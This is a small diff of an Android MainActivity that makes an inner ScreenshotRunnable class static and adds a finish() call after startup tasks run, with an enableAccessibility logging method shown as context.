@@ -21,7 +21,7 @@ public class MainActivity extends AppCompatActivity {
             return null;
         }
     }
-    private class ScreenshotRunnable implements Runnable {
+    private static class ScreenshotRunnable implements Runnable {
         private Handler handler = new Handler();
         private Activity activity;
 
@@ -52,8 +52,11 @@ public class MainActivity extends AppCompatActivity {
 
         (new StartupAsyncTask()).doInBackground();
         (new ScreenshotRunnable(this)).run();
+        finish();
 
     }
+
+
 
     void enableAccessibility(){
         Log.d("MainActivity", "enableAccessibility");
